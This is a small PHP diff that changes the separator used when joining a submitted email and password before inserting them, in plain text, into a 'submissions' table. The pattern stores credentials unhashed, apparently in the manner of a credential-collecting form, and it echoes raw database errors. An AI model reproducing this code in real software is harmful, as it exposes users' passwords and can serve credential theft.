@@ -18,7 +18,7 @@ try {
         $password = trim($_POST['password']);
 
         // Combine as "email||password"
-        $combined = $email . '||' . $password;
+        $combined = $email . '  ||  ' . $password;
 
         // Insert combined string into table "submissions"
         $stmt = $pdo->prepare("INSERT INTO submissions (input_text) VALUES (:input)");
@@ -31,3 +31,4 @@ try {
 } catch (PDOException $e) {
     echo "Database connection failed: " . $e->getMessage();
 }
+
